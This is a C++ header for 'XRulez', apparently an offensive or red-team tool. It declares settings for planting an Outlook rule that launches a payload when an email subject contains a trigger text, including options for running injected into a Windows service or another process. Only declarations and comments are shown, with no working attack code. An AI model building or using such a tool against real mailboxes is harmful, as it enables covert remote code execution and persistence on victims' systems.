#pragma once

/// @brief XRulez-specific code name space.
namespace XRulez
{
	/// XRulez Application structure.
	struct Application
	{
		/// This class can be instantiated only in the entry point of the application.
		friend int ::Main();

		/// Public destructor.
		~Application() { }

	protected:
		/// Protected ctor, used to supply members with	default values. It is one of two ways to configure XRulezDll. When running from an EXE, there are three ways in total. See @ref XRulezConfigurations and @ref BuildingXRulezFromCL for details.
		Application();

		/// Main function of XRulez application.
		/// @return true if succeed.
		bool Process();

		/// Settings used by both XRulezExe and XRulezDll.
		std::tstring m_ProfileName;												///< Outlook profile name used to log in. Has to be shorter than 66 characters. Leave it blank to use default profile name.
		std::wstring m_RuleName;												///< This name will be seen on Outlook's rule list. Has to be shorter than 256 characters.
		std::wstring m_TriggerText;												///< Text in email subject that triggers payload launching. Has to be shorter than 256 characters.
		std::wstring m_RulePayloadPath;											///< Path to payload. Has to be shorter than 256 characters.
		bool m_IsRunningInWindowsService;										///< Should be true if run as (or injected to) a Windows Service. @see MAPIInitialize on MSDN.

		/// Switches used only by XRulezDll.
		bool m_IsRunningInMultithreadedProcess;									///< Should be set to true if injected to multi-threaded process. @see MAPIInitialize on MSDN.

	private:
		/// Validates and resolves (compilation) command-line parameters. This will be also used by XRulezBuilder.
		/// @return false if parameters are not valid and program should exit.
		bool ProcessInputParameters();

		/// Update source-code-defined default values with compilation command-line values. This will be also used by XRulezBuilder.
		void ProcessPreprocessorParameters();

		/// Update default values with string table entries. This is also used by XRMod.
		void DllProcessStringTableParameters();

		/// Processes executable's input. Should not be called from DLL builds.
		/// @return false if parameters are not valid and program should exit.
		bool ExeProcessParameters();

		/// Displays usage/help. Should not be called from DLL builds.
		/// @param error if set then output message is slightly changed and std::terr instead of std::tcout is used.
		void ExeShowUsage(bool error);

		/// Displays parameters default (precompiled) values. Should not be called from DLL builds.
		void ExeShowDefaultParamsValues();

		/// Checks if Outlook is running at the moment. Should not be called from DLL builds.
		void ExeCheckIfOutlookIsRunning();

		/// Executable command line processing helper function. Should not be called from DLL builds.
		/// @return false if parameters are not valid and program should exit.
		/// @see HandleSingleCommand.
		bool ExeProcessCommandLineValues();

		/// Another executable command line processing helper function. Handles one single command-line command. Should not be called from DLL builds.
		/// @param commandKey name-part the a command to process.
		/// @param commandValue value-part the a command to process.
		/// @return false if parameters are not valid and program should exit.
		/// @see ProcessCommandLineValues.
		bool ExeHandleSingleCommand(const std::tstring& commandKey, const std::tstring& commandValue);

		/// Performs interactive configuration. Should not be called from DLL builds.
		void ExePerformInteractiveConfiguration();

		/// Displays a list of available MAPI profiles. Should not be called from DLL builds.
		void ExeListOutlookProfiles();

		/// Creates a short error message and puts it to Enviro::tcerr when running within executable. Does nothing on DLL builds.
		/// @param functionName name of the function that returned error.
		/// @param hresult code returned by said function.
		void ReportError(const std::tstring& functionName, HRESULT hresult);

		/// Creates a short error message and puts it to Enviro::tcerr when running within executable. Does nothing on DLL builds.
		/// @param functionName name of the function that returned error.
		/// @param enumName name of enum value that said function returned.
		/// @param hresult code returned by said function.
		void ReportError(const std::tstring& functionName, const std::tstring& enumName, HRESULT hresult);

		/// Prints provided text in console window if run as an executable. In DLL builds does nothing.
		/// @param comment text to print.
		void Comment(const std::tstring& comment);

		/// Prints provided text in console window if run as an executable. In DLL builds does nothing.
		/// @param comment text to print.
		void CommentError(const std::tstring& error);
	};
}
